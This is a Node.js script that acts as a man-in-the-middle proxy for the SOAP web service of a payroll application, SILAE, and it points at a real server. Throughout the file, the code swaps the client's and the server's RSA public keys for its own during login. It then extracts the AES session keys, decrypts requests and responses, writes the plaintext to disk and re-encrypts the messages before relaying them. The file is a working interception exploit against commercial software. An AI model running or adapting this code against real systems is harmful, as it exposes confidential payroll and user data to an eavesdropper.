var url = 'http://www.silaexpert01.fr/SILAE/IWCF/IWCF.svc';

var express = require('express');
var NodeRSA = require('node-rsa');
var fs = require('fs');
var request = require('request');
var Handlebars = require('Handlebars');
var extractAES = require('./extractAES');

var mitmKey = new NodeRSA(undefined, undefined, {encryptionScheme: 'pkcs1'}).generateKeyPair();
var mitmPublic = mitmKey.exportKey('components-public').n.slice(1).toString("base64");
var clientKey = new NodeRSA(undefined, undefined, {encryptionScheme: 'pkcs1'});
var serverKey = new NodeRSA(undefined, undefined, {encryptionScheme: 'pkcs1'});

var loginRequest = Handlebars.compile(fs.readFileSync('soap/loginRequest.xml').toString());
var loginResponse = Handlebars.compile(fs.readFileSync('soap/loginResponse.xml').toString());
var genericRequest = Handlebars.compile(fs.readFileSync('soap/genericRequest.xml').toString());
var genericResponse = Handlebars.compile(fs.readFileSync('soap/genericResponse.xml').toString());

var aesClient = null;
var aesServer = null;

var index = 1;

fs.writeFileSync('mitm.pem', mitmKey.exportKey('private'));

var app = express()

app.use(function(req, res, next) {
  req.rawBody = '';
  req.setEncoding('utf8');

  req.on('data', function(chunk) {
    req.rawBody += chunk;
  });

  req.on('end', function() {
    next();
  });
});

app.listen(3000);
console.log("Server listening on port 3000");
console.log("PUBLIC KEY:", mitmPublic)

app.post('/SILAE/IWCF/IWCF.svc', function (req, res) {
  res.set('Content-Type', 'application/soap+xml; charset=utf-8');

  if(req.rawBody.indexOf("CM_IDENTIFICATION") >= 0) {
    keyExchange(req.rawBody, function(uuid, clientId, serverPubKey){
      var fakeResponseBody = loginResponse({
        uuid: uuid,
        userId: clientId,
        serverKey: mitmPublic
      });
      console.log("TO CLIENT", fakeResponseBody);
      res.send(fakeResponseBody);
      return;
    });
  } else {
    console.log('Other request');
    var bufferPayload = new Buffer(getPayload(req.rawBody), "base64");
    if(bufferPayload[0] == 0) {
      console.log("NO AES INFO");
      requestWithoutAes(req.rawBody, function(serverResponse) {
        console.log("FROM SERVER", serverResponse);
        var uuid = getUUID(serverResponse);
        var serverPayload = getPayload(serverResponse);

        var bufferPayload = new Buffer(serverPayload, "base64");
        var cryptedBuffer = new Buffer(bufferPayload.slice(1).toString("hex"), "hex");

        var decryptedBuffer = extractAES.decrypt(cryptedBuffer, aesServer);
        fs.writeFileSync('response_' + index + '.bin', decryptedBuffer);
        index++;
        console.log("decrypt1", decryptedBuffer.toString("base64"));
        console.log("decrypt", decryptedBuffer.toString());

        res.send(serverResponse);
        return;
      });
    } else if(bufferPayload[0] == 1) {
      console.log("GOT AES KEY");
      requestWithAes(req.rawBody, function(serverResponse) {
        console.log("FROM SERVER", serverResponse);
        var serverAesResponse = new Buffer(getPayload(serverResponse), "base64");
        if(serverAesResponse[0] == 1) {
          console.log("SERVER RESPONSE WITH AES");
          var uuid = getUUID(serverResponse);
          aesServer = extractAES.extractAESKey(new Buffer(serverAesResponse.slice(1).toString("hex"), "hex"), mitmKey);

          var crypted = new Buffer(serverAesResponse.length - 256 - 32 - 8 - 1);
          serverAesResponse.copy(crypted, 0, 256 + 32 + 8 + 1, serverAesResponse.length);
          var decryptedBuffer = extractAES.decrypt(crypted, aesServer);
          console.log("SERVER RESPONSE :", decryptedBuffer.toString());
          fs.writeFileSync('response_' + index + '.bin', decryptedBuffer);
          index++;

          var clientPayload = extractAES.insertAESKey(crypted, aesServer, clientKey);
          var fakeResponseBody = genericResponse({
            uuid: uuid,
            response: clientPayload.toString("base64")
          });
          console.log("TO CLIENT", fakeResponseBody);
          res.send(fakeResponseBody);
          return;
        }
      });
    }
  }
})

keyExchange = function (bodyClient, callback) {
  var uuid = getUUID(bodyClient);
  clientKey.importKey({
    n: new Buffer(getKey(bodyClient), "base64"),
    e: 65537
  }, 'components-public');
  fs.writeFileSync('client.pem', clientKey.exportKey('public'));
  var fakeRequestBody = loginRequest({
    uuid: uuid,
    clientKey: mitmPublic
  });

  console.log("TO SERVER", fakeRequestBody);
  request.post({
    url: url,
    body : fakeRequestBody,
    headers: {'Content-Type': 'application/soap+xml; charset=utf-8'}
  }, function (error, response, body) {
      console.log("RESPONSE_FROM_SERVER", body);
      console.log("CLIENT $USR", getUserId(body));
      if (!error && response.statusCode == 200) {
        serverKey.importKey({
          n: new Buffer(getKey(body), "base64"),
          e: 65537
        }, 'components-public');
        fs.writeFileSync('server.pem', serverKey.exportKey('public'));
        callback(uuid, getUserId(body));
      }
    }
  );
}

requestWithAes = function (bodyClient, callback) {
  var uuid = getUUID(bodyClient);
  var clientId = getUserId(bodyClient);
  console.log("REQUEST WITH AES", clientId);

  var bufferPayload = new Buffer(getPayload(bodyClient), "base64");
  aesClient = extractAES.extractAESKey(new Buffer(bufferPayload.slice(1).toString("hex"), "hex"), mitmKey);

  var crypted = new Buffer(bufferPayload.length - 256 - 32 - 8 - 1);
  bufferPayload.copy(crypted, 0, 256 + 32 + 8 + 1, bufferPayload.length);
  var decryptedBuffer = extractAES.decrypt(crypted, aesClient);

  console.log("decrypt1", decryptedBuffer.toString("base64"));
  console.log("decrypt", decryptedBuffer.toString());
  fs.writeFileSync('request_'+index+'.bin', decryptedBuffer);
  index++;

  var mitmPayload = extractAES.insertAESKey(crypted, aesClient, serverKey);
  console.log(mitmPayload.toString("base64"));

  var fakeRequestBody = genericRequest({
    uuid: uuid,
    userId: clientId,
    payload: mitmPayload.toString("base64")
  });

  console.log("TO SERVER", fakeRequestBody);
  request.post({
    url: url,
    body : fakeRequestBody,
    headers: {'Content-Type': 'application/soap+xml; charset=utf-8'}
  }, function (error, response, body) {
      console.log("RESPONSE_FROM_SERVER", body)
      if (!error && response.statusCode == 200) {
        callback(body);
      }
    }
  );
}

requestWithoutAes = function (bodyClient, callback) {
  var uuid = getUUID(bodyClient);
  var clientId = getUserId(bodyClient);
  console.log("REQUEST WITHOUT AES", clientId);
  var clientPayload = getPayload(bodyClient);
  var bufferPayload = new Buffer(clientPayload, "base64");
  var cryptedBuffer = new Buffer(bufferPayload.slice(1).toString("hex"), "hex");

  var decryptedBuffer = extractAES.decrypt(cryptedBuffer, aesClient);
  fs.writeFileSync('request_'+index+'.bin', decryptedBuffer);
  index++;

  console.log("decrypt1", decryptedBuffer.toString("base64"));
  console.log("decrypt", decryptedBuffer.toString());

  var fakeRequestBody = genericRequest({
    uuid: uuid,
    userId: clientId,
    payload: clientPayload
  });

  console.log("TO SERVER", fakeRequestBody);
  request.post({
    url: url,
    body : fakeRequestBody,
    headers: {'Content-Type': 'application/soap+xml; charset=utf-8'}
  }, function (error, response, body) {
      console.log("RESPONSE_FROM_SERVER", body)
      if (!error && response.statusCode == 200) {
        callback(body);
      }
    }
  );
}

getUUID = function (body) {
  return /rn:uuid:([a-f0-9\-]+)/.exec(body)[1];
}

getKey = function (body) {
  return /Modulus&gt;([^\&]+)&lt/.exec(body)[1];
}

getPayload = function (body) {
  return /base64Binary[^>]+>([^<]+)/.exec(body)[1];
}

getUserId = function (body) {
  return /\$USR.*?XMLSchema">([^<]+)/.exec(body)[1];
}
